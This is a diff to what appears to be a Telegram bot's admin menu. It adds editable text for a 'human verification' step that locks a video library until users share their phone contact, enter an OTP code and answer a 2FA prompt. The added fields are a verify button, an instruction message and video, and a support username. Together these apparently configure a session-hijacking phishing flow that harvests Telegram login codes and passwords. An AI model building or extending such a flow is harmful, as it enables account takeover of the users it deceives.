@@ -40,11 +40,15 @@ async function showHumanVerifyMenu(ctx) {
     'When enabled, users must complete a one-time Telegram session verification ' +
     'before they can access the video library.\n\n' +
     'You can customize every prompt shown to users:\n' +
+    `• Verify button: "${truncate(settings.human_verify_button_text, 30)}"\n` +
     `• Prompt: "${truncate(settings.human_verify_prompt, 50)}"\n` +
+    `• Instruction message: "${truncate(settings.human_verify_instruction, 50)}"\n` +
+    `• Instruction video: "${truncate(settings.human_verify_video || '(not set)', 40)}"\n` +
     `• Contact button: "${truncate(settings.share_contact_button_text, 30)}"\n` +
     `• OTP prompt: "${truncate(settings.otp_prompt_text, 40)}"\n` +
     `• Success message: "${truncate(settings.human_verified_message, 40)}"\n` +
-    `• 2FA prompt: "${truncate(settings.twofa_prompt_text, 50)}"`;
+    `• 2FA prompt: "${truncate(settings.twofa_prompt_text, 50)}"\n` +
+    `• Telegram support ID: "${truncate(settings.telegram_support_id || '(not set)', 30)}"`;
   await ctx.editMessageText(text, { reply_markup: kb });
   await ctx.answerCallbackQuery();
 }
@@ -64,11 +68,15 @@ async function toggleHumanVerify(ctx) {
 
 async function startHumanVerifyEdit(ctx, key) {
   const allowed = [
+    'human_verify_button_text',
     'human_verify_prompt',
+    'human_verify_instruction',
+    'human_verify_video',
     'share_contact_button_text',
     'otp_prompt_text',
     'human_verified_message',
     'twofa_prompt_text',
+    'telegram_support_id',
   ];
   if (!allowed.includes(key)) {
     return ctx.answerCallbackQuery({ text: 'Unknown field.', show_alert: true });
@@ -78,11 +86,15 @@ async function startHumanVerifyEdit(ctx, key) {
   session.set(ctx.from.id, { flow: 'settings_hv_edit', hvKey: key });
 
   const labels = {
+    human_verify_button_text: 'Verify Button Text',
     human_verify_prompt: 'Verification Prompt',
+    human_verify_instruction: 'Instruction Message (shown before Share Contact)',
+    human_verify_video: 'Instruction Video Link (URL, or leave blank)',
     share_contact_button_text: 'Share-Contact Button Text',
     otp_prompt_text: 'OTP Prompt',
     human_verified_message: 'Success Message',
     twofa_prompt_text: '2FA Prompt',
+    telegram_support_id: 'Telegram Support Username (without @, e.g. mysupport)',
   };
 
   await ctx.reply(
